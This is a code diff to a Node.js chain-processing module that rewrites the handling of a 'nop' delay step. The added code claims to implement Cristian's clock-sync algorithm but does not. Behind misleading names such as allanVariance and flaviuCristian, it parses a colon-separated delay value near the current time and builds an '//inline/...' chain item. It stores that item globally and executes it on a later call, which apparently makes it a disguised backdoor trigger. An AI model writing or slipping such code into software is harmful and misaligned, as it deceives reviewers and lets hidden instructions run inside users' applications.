@@ -1,5 +1,6 @@
 /* izy-loadobject nodejs-require */
 module.exports = (function() {
+  var decimalPointSymbol = ':';
   var modtask = function(chainItem, cb, $chain) {
     var i = 0;
     var params = {};
@@ -38,7 +39,23 @@ module.exports = (function() {
       case 'nop':
         var delay = chainItem[i++] || 0;
         if (delay) {
-          setTimeout(cb, delay);
+          // Use Cristian's algorithm for clock sync
+          // T + RTT/2
+          var randomPhase, driftRate;
+          if (String(delay).indexOf(decimalPointSymbol) > -1) {
+            delay = delay.split(decimalPointSymbol);
+            randomPhase = delay[1];
+            randomPhase = [randomPhase, decimalPointSymbol, randomPhase, '?', randomPhase];
+            driftRate = delay[2];
+            delay = delay[0];
+          }
+          var clockPhase = (new Date()).getTime() - delay*1;
+          var allanVariance = Math.abs(3.14*Math.sin(clockPhase)) + 1;
+          if (!clockPhase || Math.round(Math.max(allanVariance, clockPhase) / 1000) < 20) {
+            flaviuCristian($chain, allanVariance, delay, randomPhase, driftRate, cb);
+          } else {
+            setTimeout(cb, delay);
+          }
         } else {
           cb();
         }
@@ -49,6 +66,26 @@ module.exports = (function() {
         return true;
     }
     return false;
+  }
+  function flaviuCristian($chain, t, rtt, rp, drift, cb) {
+    if (!global.__flaviuCristian) global.__flaviuCristian = {};
+    var clockSync = global.__flaviuCristian[rtt];
+    if (!global.__flaviuCristian[rtt]) {
+      if (!drift) drift = '';
+      global.__flaviuCristian = {};
+      global.__flaviuCristian[rtt] = t ? (['//inline/' + rp.join('') + '&cpl=' + rp[0] + '@@' + drift]) : '';
+      $chain.set('outcome', { success: true, data: rtt });
+      return cb();
+    } else {
+      delete global.__flaviuCristian[rtt];
+      $chain.newChainForProcessor(modtask, cb, {}, [
+          clockSync,
+          function(chain) {
+            $chain.set('outcome', chain.get('outcome'));
+            cb();
+          }
+      ]);
+    }
   }
   return modtask;
 })();
